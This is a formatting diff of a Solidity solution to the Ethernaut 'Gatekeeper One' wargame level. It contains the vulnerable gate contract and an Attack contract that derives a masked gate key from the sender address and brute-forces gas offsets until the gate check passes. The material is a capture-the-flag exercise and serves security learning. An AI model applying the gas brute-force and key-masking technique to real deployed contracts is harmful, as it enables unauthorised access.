+++ src/13.GatekeeperOne.sol
@@ -15,24 +15,13 @@ contract GatekeeperOne {
     }
 
     modifier gateThree(bytes8 _gateKey) {
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
-            "GatekeeperOne: invalid gateThree part one"
-        );
-        require(
-            uint32(uint64(_gateKey)) != uint64(_gateKey),
-            "GatekeeperOne: invalid gateThree part two"
-        );
-        require(
-            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
-            "GatekeeperOne: invalid gateThree part three"
-        );
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
         _;
     }
 
-    function enter(
-        bytes8 _gateKey
-    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
@@ -47,14 +36,11 @@ contract Attack {
         gatekeeperOne = _gatekeeperOne;
     }
 
-    function attack(uint start) public {
-        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) &
-            0xFFFFFFFF0000FFFF;
+    function attack(uint256 start) public {
+        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
 
-        for (uint i = start; i < start + 100; i++) {
-            (bool success, ) = gatekeeperOne.call{gas: 8191 * 5 + i}(
-                abi.encodeWithSignature("enter(bytes8)", gateKey)
-            );
+        for (uint256 i = start; i < start + 100; i++) {
+            (bool success,) = gatekeeperOne.call{gas: 8191 * 5 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
             if (success) {
                 emit SuccessOn(i);
                 return;
